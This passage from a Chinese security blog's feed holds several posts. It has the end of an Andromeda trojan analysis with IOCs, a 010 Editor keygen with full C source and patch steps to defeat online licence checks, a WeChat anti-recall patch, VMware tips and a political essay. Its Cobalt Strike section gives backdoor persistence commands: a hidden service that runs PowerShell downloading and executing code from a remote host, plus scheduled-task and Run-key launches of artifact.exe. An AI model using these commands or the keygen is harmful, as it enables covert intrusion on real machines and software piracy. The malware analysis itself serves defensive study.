title="image-20210705154023635"><p>因为仙女座已经被摧毁后续的命令下发执行操作无法继续分析，通过前面的分析可以看到这是一个模块化的病毒样本，分阶段释放了大量的exe和dll文件最终注入了系统进程wuauclt.exe，并在多线程和内存中释放的多模块之间跳转执行并将上传和下载的信息都进行了加密处理一定程度上加大了分析的难度，具有较高的稳定性和隐蔽性。模块的功能有浏览器cookie抓取，本机信息获取等行为。</p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p>xdqzpbcgrvkj.ru<br>orzdwjtvmein.in<br>anam0rph.su<br>ygiudewsqhct.in<br>bdcrqgonzmwuehky.nl<br>somicrososoft.ru<br>pe.suckmycocklameavindustry.in<br>sc.suckmycocklameavindustry.in</p><h2 id="释放的文件"><a href="#释放的文件" class="headerlink" title="释放的文件"></a>释放的文件</h2><table><thead><tr><th>文件名</th><th>MD5</th></tr></thead><tbody><tr><td>Befunuvatur.dll</td><td>5E1BD554B134DAF7753021CA7AE9C362</td></tr><tr><td>Fewuxusahif.dll</td><td>1e1120080170a963da2dc9461789f1c1</td></tr><tr><td>hewefuxasa.exe</td><td>9537cf2d215b97bc3effadd74e1a75c9</td></tr><tr><td>Hunoqoriqop.dll</td><td>ae057dff4e992c5208234b3d62b05f40</td></tr><tr><td>reyefiyevu.exe</td><td>c86fc56810ae163cbd8a728c4d501948</td></tr><tr><td>salebolotew.dll</td><td>d75174a7147f7a1c3fa59dcb60be70ad</td></tr><tr><td>vinoliwulab.dll</td><td>e255130efe8242a6e2573ba63a667f2d</td></tr><tr><td>wehexukaje.Gav</td><td>85d804cd262bfc55dcd09bbec078c1e9</td></tr><tr><td>xizitixeqob.dll</td><td>08d784e44da8fcf358b2c932ee318293</td></tr><tr><td>Zayimahizo.dll</td><td>5a8f117565e4add93e564ad9ac086c85</td></tr><tr><td>Ziniyucenaqe.dll</td><td>439b2205e6e881e64dde45b0c71f4dfe</td></tr><tr><td>msqvfea.bat</td><td>92804812b5fd9459f7cf3c2d607804c1</td></tr><tr><td>msiexec.exe</td><td>92804812b5fd9459f7cf3c2d607804c1</td></tr><tr><td>msyalicw.com</td><td>92804812b5fd9459f7cf3c2d607804c1</td></tr><tr><td>msozpgci.exe</td><td>eb069d27bae4c00dc581f670f2423bb8</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Andromeda木马 </tag>
            
            <tag> windows木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>010EDIT破解&amp;注册机</title>
      <link href="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/"/>
      <url>/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h3><p>010edit是一款非常好用的二进制文本编辑器，但是这款软件不是免费的，so让我们来分析一下它的算法，写一下注册机。</p><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p>win7 32虚拟机，OD，IDA</p><h3 id="分析目标"><a href="#分析目标" class="headerlink" title="分析目标"></a>分析目标</h3><ol><li>编写注册机</li><li>去除网络验证</li></ol><h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h3><span id="more"></span><h4 id="0x00-今天我们分析的是9-0版本"><a href="#0x00-今天我们分析的是9-0版本" class="headerlink" title="0x00 今天我们分析的是9.0版本"></a>0x00 今天我们分析的是9.0版本</h4><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551343193(1).jpg" class="" title="img"><h4 id="0x01-开始分析，我们点击register按钮，弹出来窗口让我们输入用户名-amp-密码"><a href="#0x01-开始分析，我们点击register按钮，弹出来窗口让我们输入用户名-amp-密码" class="headerlink" title="0x01 开始分析，我们点击register按钮，弹出来窗口让我们输入用户名&amp;密码"></a>0x01 开始分析，我们点击register按钮，弹出来窗口让我们输入用户名&amp;密码</h4><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549007784(1).jpg" class="" title="img"><p>随便先输入了一组用户名和密码，弹出了提示窗口，接下来我们用OD打开010来查找这个字符串</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549009303(1).jpg" class="" title="img"><p>双击找到字符串的位置，往上分析看是从什么地方跳过来的，通过下断点尝试我们找到了这个它做验证的位置</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549010306(1).jpg" class="" title="img"><h4 id="0x02-接下来我们对关键算法函数进行详细分析"><a href="#0x02-接下来我们对关键算法函数进行详细分析" class="headerlink" title="0x02 接下来我们对关键算法函数进行详细分析"></a>0x02 接下来我们对关键算法函数进行详细分析</h4><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549011565(1).jpg" class="" title="img"><p>在这里我们发现指令对我们输入的密码进行了一系列的操作验证</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549012535(1).jpg" class="" title="img"><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549266039(1).jpg" class="" title="img"><p>我们需要把对密码的验证操作逐条分析出来，便于写注册机时使用</p><p>通过对这一块的分析，我们得到了密码的验证规则，接下来我们写代码尝试验证看我们分析的是否正确</p><pre><code>#include "stdafx.h"#include &lt;Windows.h&gt;#include&lt;time.h&gt;int main(){ srand(time(NULL)); byte k[10] = { 0X11,0X22,0X33,0X9C,0X55,0X66,0X77,0X88,0X99,0X00 }; while (true) {  byte K0 = rand() % 0xff;  byte K6 = rand() % 0xff;  byte al = ((K0 ^ K6) ^ 0x18 + 0x3d) ^ 0xa7;  if (al &gt; 0)  {   k[0] = K0;   k[6] = K6;   break;  } } while (true) {  byte K1 = rand() % 0xff;  byte K7 = rand() % 0xff;  byte K2 = rand() % 0xff;  byte K5 = rand() % 0xff;  DWORD ESI = (0x100 * (K1 ^ K7 &amp; 0xff) + K2^K5 &amp; 0xff) &amp; 0xffff;  DWORD EAX = (((ESI ^ 0x7892) + 0x4d30) ^ 0x3421) &amp; 0xffff;  if (EAX % 0xb == 0 &amp;&amp; EAX / 0xb &lt;= 0x3e8)  {   k[1] = K1;   k[7] = K7;   k[2] = K2;   k[5] = K5;   break;  } } printf("%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X", k[0], k[1], k[2], k[3], k[4], k[5], k[6], k[7], k[8], k[9]); getchar();    return 0;}</code></pre><p>这样我们打开vs执行上面的代码可以得到符合密码验证规则的一个秘钥</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549612731(1).jpg" class="" title="img"><p>但是这样输进去之后，我们依旧是不能成功的，like this</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549613332(1).jpg" class="" title="img"><p>因为这只是第一轮对密码的单独验证，在它后面还有第二轮验证，在第二轮验证中会把用户名也放进来和密码形成一个对应关系，符合了这两次的验证，我们的密码验证才算是通过。</p><h4 id="0x03-接下来我们开始分析第二轮的验证"><a href="#0x03-接下来我们开始分析第二轮的验证" class="headerlink" title="0x03. 接下来我们开始分析第二轮的验证"></a>0x03. 接下来我们开始分析第二轮的验证</h4><p>继续单步F8往下跟，不远处会有一个跳转，跳转之后开始了第二轮的验证</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551265907.jpg" class="" title="img"><p>在分析第二轮验证的时候我们要重点分析，用户名和密码之间的对应关系，来编写后面的代码</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551266349(1).jpg" class="" title="img"><p>a. 通过对上面这块代码的分析我们知道了，用户名是和K[4] ~ K[7]有一定的对应关系的</p><h4 id="0x04-现在我们梳理一下我们已有的信息"><a href="#0x04-现在我们梳理一下我们已有的信息" class="headerlink" title="0x04 现在我们梳理一下我们已有的信息"></a>0x04 现在我们梳理一下我们已有的信息</h4><p>a. 如果K[3] = 9C的话, 密码只需要8个字节就可以了.<br>b. 我们通过上面的代码已经知道了, K[0] ~ K[7]怎么样才可以通过第一轮的验证.</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551268502(1).jpg" class="" title="img"><p>c. 通过分析我们得知K[4] = sub_1062f86返回值的最后一个字节, K[5] = 倒数第二个字节, K[6], K[7]以此类推.<br>d. 然后我们发现通过上面的对应关系我们只要求出来了用户名的值, 就已经得到了K[4] ~ K[7]的值.<br>e. 然后我们需要思考, 怎么才能得到程序中传入用户名求出的值.</p><h4 id="0x05-let’s-do-it"><a href="#0x05-let’s-do-it" class="headerlink" title="0x05 let’s do it"></a>0x05 let’s do it</h4><p> 从OD里面找到sub_1062f86按F7进去&gt;ctrl + x复制地址&gt;在IDA里面G搜索这个地址(如果有重定位的话记得去掉重定位: edit&gt;segments&gt;rebase program )</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551282055.jpg" class="" title="img"><p>按F5把汇编转换成C代码&gt;会看到里面用到了一个数组&gt;将这个数组以字节的方式拷贝出来</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551282512(1).jpg" class="" title="img"><p>将数组以字节的形式拷贝出来(因为OD没装数据转换插件所以用的x32拷贝)</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551340686(1).jpg" class="" title="img"><p>然后看一下参数是否需要修改(这里面需要修改最后一个参数的类型改为DWORD)(是否需要修改可以看OD里面的参数类型)</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551338641(1).jpg" class="" title="img"><p>然后Ctrl+A全选&gt;复制,将之作为一个函数粘贴到我们之前的代码里面</p><p>这样我们就完成了, 我们注册机代码的编写</p><pre><code>// decode010.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#include &lt;windows.h&gt;#include &lt;time.h&gt;DWORD g_EcodeArray[] ={ 0x39CB44B8, 0x23754F67, 0x5F017211, 0x3EBB24DA, 0x351707C6, 0x63F9774B, 0x17827288, 0x0FE74821, 0x5B5F670F, 0x48315AE8, 0x785B7769, 0x2B7A1547,0x38D11292, 0x42A11B32, 0x35332244, 0x77437B60, 0x1EAB3B10, 0x53810000, 0x1D0212AE, 0x6F0377A8, 0x43C03092, 0x2D3C0A8E, 0x62950CBF, 0x30F06FFA,0x34F710E0, 0x28F417FB, 0x350D2F95, 0x5A361D5A, 0x15CC060B, 0x0AFD13CC, 0x28603BCF, 0x3371066B, 0x30CD14E4, 0x175D3A67, 0x6DD66A13, 0x2D3409F9,0x581E7B82, 0x76526B99, 0x5C8D5188, 0x2C857971, 0x15F51FC0, 0x68CC0D11, 0x49F55E5C, 0x275E4364, 0x2D1E0DBC, 0x4CEE7CE3, 0x32555840, 0x112E2E08,0x6978065A, 0x72921406, 0x314578E7, 0x175621B7, 0x40771DBF, 0x3FC238D6, 0x4A31128A, 0x2DAD036E, 0x41A069D6, 0x25400192, 0x00DD4667, 0x6AFC1F4F,0x571040CE, 0x62FE66DF, 0x41DB4B3E, 0x3582231F, 0x55F6079A, 0x1CA70644, 0x1B1643D2, 0x3F7228C9, 0x5F141070, 0x3E1474AB, 0x444B256E, 0x537050D9,0x0F42094B, 0x2FD820E6, 0x778B2E5E, 0x71176D02, 0x7FEA7A69, 0x5BB54628, 0x19BA6C71, 0x39763A99, 0x178D54CD, 0x01246E88, 0x3313537E, 0x2B8E2D17,0x2A3D10BE, 0x59D10582, 0x37A163DB, 0x30D6489A, 0x6A215C46, 0x0E1C7A76, 0x1FC760E7, 0x79B80C65, 0x27F459B4, 0x799A7326, 0x50BA1782, 0x2A116D5C,0x63866E1B, 0x3F920E3C, 0x55023490, 0x55B56089, 0x2C391FD1, 0x2F8035C2, 0x64FD2B7A, 0x4CE8759A, 0x518504F0, 0x799501A8, 0x3F5B2CAD, 0x38E60160,0x637641D8, 0x33352A42, 0x51A22C19, 0x085C5851, 0x032917AB, 0x2B770AC7, 0x30AC77B3, 0x2BEC1907, 0x035202D0, 0x0FA933D3, 0x61255DF3, 0x22AD06BF,0x58B86971, 0x5FCA0DE5, 0x700D6456, 0x56A973DB, 0x5AB759FD, 0x330E0BE2, 0x5B3C0DDD, 0x495D3C60, 0x53BD59A6, 0x4C5E6D91, 0x49D9318D, 0x103D5079,0x61CE42E3, 0x7ED5121D, 0x14E160ED, 0x212D4EF2, 0x270133F0, 0x62435A96, 0x1FA75E8B, 0x6F092FBE, 0x4A000D49, 0x57AE1C70, 0x004E2477, 0x561E7E72,0x468C0033, 0x5DCC2402, 0x78507AC6, 0x58AF24C7, 0x0DF62D34, 0x358A4708, 0x3CFB1E11, 0x2B71451C, 0x77A75295, 0x56890721, 0x0FEF75F3, 0x120F24F1,0x01990AE7, 0x339C4452, 0x27A15B8E, 0x0BA7276D, 0x60DC1B7B, 0x4F4B7F82, 0x67DB7007, 0x4F4A57D9, 0x621252E8, 0x20532CFC, 0x6A390306, 0x18800423,0x19F3778A, 0x462316F0, 0x56AE0937, 0x43C2675C, 0x65CA45FD, 0x0D604FF2, 0x0BFD22CB, 0x3AFE643B, 0x3BF67FA6, 0x44623579, 0x184031F8, 0x32174F97,0x4C6A092A, 0x5FB50261, 0x01650174, 0x33634AF1, 0x712D18F4, 0x6E997169, 0x5DAB7AFE, 0x7C2B2EE8, 0x6EDB75B4, 0x5F836FB6, 0x3C2A6DD6, 0x292D05C2,0x052244DB, 0x149A5F4F, 0x5D486540, 0x331D15EA, 0x4F456920, 0x483A699F, 0x3B450F05, 0x3B207C6C, 0x749D70FE, 0x417461F6, 0x62B031F1, 0x2750577B,0x29131533, 0x588C3808, 0x1AEF3456, 0x0F3C00EC, 0x7DA74742, 0x4B797A6C, 0x5EBB3287, 0x786558B8, 0x00ED4FF2, 0x6269691E, 0x24A2255F, 0x62C11F7E,0x2F8A7DCD, 0x643B17FE, 0x778318B8, 0x253B60FE, 0x34BB63A3, 0x5B03214F, 0x5F1571F4, 0x1A316E9F, 0x7ACF2704, 0x28896838, 0x18614677, 0x1BF569EB,0x0BA85EC9, 0x6ACA6B46, 0x1E43422A, 0x514D5F0E, 0x413E018C, 0x307626E9, 0x01ED1DFA, 0x49F46F5A, 0x461B642B, 0x7D7007F2, 0x13652657, 0x6B160BC5,0x65E04849, 0x1F526E1C, 0x5A0251B6, 0x2BD73F69, 0x2DBF7ACD, 0x51E63E80, 0x5CF2670F, 0x21CD0A03, 0x5CFF0261, 0x33AE061E, 0x3BB6345F, 0x5D814A75,0x257B5DF4, 0x0A5C2C5B, 0x16A45527, 0x16F23945 };int __cdecl EnCodeUsername(const char *userName, int a2, char a3, unsigned __int16 a4)    // 计算用户名字符串的值{ const char *v4; // edx@1 signed int v5; // esi@1 signed int v6; // edi@1 unsigned __int8 v7; // bl@2 int v8; // eax@3 int v9; // ecx@3 int v10; // ecx@4 int result; // eax@4 int v12; // ecx@5 unsigned __int8 v13; // [sp+8h] [bp-10h]@2 unsigned __int8 v14; // [sp+Ch] [bp-Ch]@2 unsigned __int8 v15; // [sp+10h] [bp-8h]@2 int v16; // [sp+14h] [bp-4h]@1 v4 = userName; v16 = 0; v5 = strlen(userName); v6 = 0; if (v5 &lt;= 0) {  result = 0; } else {  v13 = 0;  v14 = 0;  v7 = 15 * a4;  v15 = 17 * a3;  do  {   v8 = toupper(v4[v6]);   v9 = v16 + g_EcodeArray[v8];   if (a2)   {    v10 = g_EcodeArray[v7]     + g_EcodeArray[v15]     + g_EcodeArray[(unsigned __int8)(v8 + 47)] * (g_EcodeArray[(unsigned __int8)(v8 + 13)] ^ v9);    result = g_EcodeArray[v14] + v10;    v16 = g_EcodeArray[v14] + v10;   }   else   {    v12 = g_EcodeArray[v7]     + g_EcodeArray[v15]     + g_EcodeArray[(unsigned __int8)(v8 + 23)] * (g_EcodeArray[(unsigned __int8)(v8 + 63)] ^ v9);    result = g_EcodeArray[v13] + v12;    v16 = g_EcodeArray[v13] + v12;   }   v14 += 19;   ++v6;   v15 += 9;   v7 += 13;   v13 += 7;   v4 = userName;  } while (v6 &lt; v5); } return result;}int main(){ srand(time(NULL)); // 0. 初始化 int dwRet = rand() % 0x3E8; byte k[10] = { 0x11, 0x22, 0x33, 0x9C, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00 }; // 用户名,加密求值 char szName[50] = { 0 }; printf("please enter user name:"); scanf_s("%s", szName, 50); DWORD dwKey = EnCodeUsername(szName,1,0,dwRet); // 给k[4]~k[7]赋值 // cmp K[4], retValue&amp;0xFF // cmp K[5], retValue&gt;&gt;8&amp;&amp;0xFF // cmp k[6], retvalue&gt;&gt;16&amp;&amp;0xFF // cmp k[7], retvalue&gt;&gt;24&amp;&amp;0xff k[4] = dwKey &amp; 0xFF; k[5] = dwKey &gt;&gt; 8 &amp; 0xFF; k[6] = dwKey &gt;&gt; 16 &amp; 0xFF; k[7] = dwKey &gt;&gt; 24 &amp; 0xFF; // 根据分析出来的算法穷举出合适的值 while (true) {  byte k0 = rand() % 0xff;  byte k6 = k[6];  byte al = ((k0 ^ k6) ^ 0x18 + 0x3d) ^ 0xa7;  if (al &gt;= 0xA)  {   k[0] = k0;   k[6] = k6;   break;  } } while (true) {  byte k1 = rand() % 0xff;  byte k7 = k[7];  byte k2 = rand() % 0xff;  byte k5 = k[5];  DWORD ESI = (0x100 * (k1 ^ k7 &amp; 0xff) + k2 ^ k5 &amp; 0xff) &amp; 0xffff;  DWORD EAX = (((ESI ^ 0x7892) + 0x4d30) ^ 0x3421) &amp; 0xffff;  if (EAX % 0XB == 0 &amp;&amp; EAX / 0XB == dwRet)  {   k[1] = k1;   k[7] = k7;   k[2] = k2;   k[5] = k5;   break;  } } // 打印key printf("%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X", k[0], k[1], k[2], k[3], k[4], k[5], k[6], k[7], k[8], k[9]); getchar(); getchar();    return 0;}</code></pre><h4 id="0x06-但是-之后在使用一段时间后-可能还会有网络验证-会提示说key无效的问题"><a href="#0x06-但是-之后在使用一段时间后-可能还会有网络验证-会提示说key无效的问题" class="headerlink" title="0x06 但是, 之后在使用一段时间后, 可能还会有网络验证, 会提示说key无效的问题"></a>0x06 但是, 之后在使用一段时间后, 可能还会有网络验证, 会提示说key无效的问题</h4><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551331582(1).jpg" class="" title="img"><p><strong>对于网络校验来说, 有两个方法可以过掉</strong></p><ol><li>自己搭建服务器, 分析它发送和接收的的数据包</li><li>修改文件使网络验证失效</li></ol><p><strong>在这里我们选用第二种方法, 来绕过它的网络验证</strong><br>在修改exe文件之前, 我们先用010把它的重定位去除掉, 位置: NtHeader &gt; FileHeader &gt; Characteristics &gt; FILE_RELOCS_STRIPPED字段</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551335094(1).png" class="" title="img"><p>然后我们开始修改汇编代码<br>经过分析我们发现这里有两处验证的函数, 需要分别修改一下</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551344447(1).jpg" class="" title="img"><p>修改过后保存一下</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551335661(1).jpg" class="" title="img"><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551335834(1).jpg" class="" title="img"><p>接下来我们继续修改后面一处验证<br>这个地方尝试了很多次, 发现eax返回1就可以通过这个验证, 像刚才一样我们把这里也修改保存下来</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551336212(1).jpg" class="" title="img"><h4 id="over"><a href="#over" class="headerlink" title="over"></a>over</h4><p>这样我们就不用担心他的网络验证问题了</p><img src="/2022/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551336622(1).jpg" class="" title="img">]]></content>
      
      
      <categories>
          
          <category> Windows软件逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注册机 </tag>
            
            <tag> 破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware问题汇总</title>
      <link href="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
      <url>/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="恢复快照出错"><a href="#恢复快照出错" class="headerlink" title="恢复快照出错"></a>恢复快照出错</h1><p>有时候在恢复快照的时候会出现找不到所需文件，无法恢复快照的问题</p><span id="more"></span><p>找到虚拟机的.vmx文件将第一个<code>scsi0.present</code>字段改为<code>FALSE</code>之后再恢复快照即可</p><img src="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/image-20210609104305024.png" class="" title="image-20210609104305024"><h1 id="安装vmtools按钮灰色无法安装vmtools"><a href="#安装vmtools按钮灰色无法安装vmtools" class="headerlink" title="安装vmtools按钮灰色无法安装vmtools"></a>安装vmtools按钮灰色无法安装vmtools</h1><p>将存储设置都改为自动检测即可</p><img src="/2021/06/09/VMware%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1614876729(1).png" class="" title="1614876729(1)">]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资本主义和社会主义</title>
      <link href="/2021/06/08/xiaoeryu%E7%9A%84%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/06/08/xiaoeryu%E7%9A%84%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-x2F-6-x2F-8"><a href="#2021-x2F-6-x2F-8" class="headerlink" title="2021/6/8"></a>2021/6/8</h1><p>马克思认为资本主义发展方向，是资本占有的社会化，走向社会主义，从资本占有的角度来说就是社会资本主义。其中的关键是，资本占有的载体不是私人为主，而应该是公有制前提下的国家持有和社会占有。是社会化占比更高的国家-社会混合型经济。</p><span id="more"></span><p>社会资本主义的承载主体，可以是社会企业、合作社、集体所有的股份公司、全员持股公司等等。</p><p>这个意义上，国有企业、社会企业、集体经济都是属于社会资本的范畴。</p><p>国有企业如果被变相搞私有化，就是假的社会资本。</p>]]></content>
      
      
      <categories>
          
          <category> 社会科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资本主义 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信防撤回</title>
      <link href="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/"/>
      <url>/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>阻止PC版微信消息撤回</p><span id="more"></span><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ol><li><p>再微信程序文件夹搜索关键字：撤回是revoke撤回消息我们搜索<code>revokemsg</code>关键字</p><img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607171641322.png" class="" title="image-20210607171641322"><img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607171912664.png" class="" title="image-20210607171912664"><ul><li>通过搜索关键字确定消息撤回的功能大概率在这个dll文件里</li></ul></li><li><p>开始用x32Dbg加载微信分析这个dll</p><p>2.1. 找到这个dll之后，在这个dll里面搜索字符串<code>revokemsg</code></p><img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607172239988.png" class="" title="image-20210607172239988"><p>2.2. 找到第一个revokemsg字符串</p><img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607172845749.png" class="" title="image-20210607172845749"><p>2.3. 双击点进去到反汇编可以看到上面有一个条件跳转，将跳转改为无条件跳转<code>jmp</code></p><img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607173229697.png" class="" title="image-20210607173229697"><p>2.4. 右键补丁保存即可</p><img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607173333151.png" class="" title="image-20210607173333151"></li></ol>]]></content>
      
      
      <categories>
          
          <category> Windows软件逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-十-可持续后门的使用</title>
      <link href="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h1><span id="more"></span><ol><li><p>先创建一个与目标机的连接并提升权限</p><img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607152012477.png" class="" title="image-20210607152012477"></li><li><p>再使用以下命令来创建自启动服务有两种方式</p><p>2.1. 一种是从远程通过web下载shell来执行自启动服务</p><pre><code>shell sc create "Windows Power" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.3.58:81/a'))\""shell sc config "Windows Power" start= autoshell sc description "Windows Power" "windows auto service"shell net start "Windows Power"// 启动服务shell sc delete "Windows Power"// 删除服务</code></pre><img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607153341617.png" class="" title="image-20210607153341617"><p>2.2. 通过执行本地的后门程序来启动</p><pre><code>shell sc create "server power" binpath= "C:\Users\Administrator\Desktop\artifact.exe"shell sc description "server power" "description" 设置服务的描述字符串shell sc config "server power" start= auto 设置这个服务为自动启动shell net start "server power" 启动服务</code></pre><ul><li>第二种方法跟第一种差不多是同样的命令，但是第二种是通过本地程序启动的，如果本地程序做了免杀处理的话会更容易躲过杀毒软件的拦截</li></ul></li></ol><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>创建任务</p><p><code>schtasks /create /tn "windowsup" /tr "C:\Users\win7-x86-analyse\Desktop\shell\artifact.exe" /ru SYSTEM /sc onstart</code></p><p>查询任务</p><p><code>schtasks /query /tn windowsup</code></p><ul><li><p>查询任务如果提示失败（无法加载资源列表）</p><p><code>chcp 437// 使用命令修改字符集</code></p><img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155030989.png" class="" title="image-20210607155030989"></li></ul><p>手工运行任务</p><p><code>schtasks /run /tn windowsup</code></p><img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155616931.png" class="" title="image-20210607155616931"><img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155640636.png" class="" title="image-20210607155640636"><h1 id="注册表启动"><a href="#注册表启动" class="headerlink" title="注册表启动"></a>注册表启动</h1><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Users\win7-x86-analyse\Desktop\shell\artifact.exe" /f</code></p><img src="/2021/06/07/Cobalt-Strike-%E5%8D%81-%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/image-20210607155817037.png" class="" title="image-20210607155817037">]]></content>
      
      
      <categories>
          
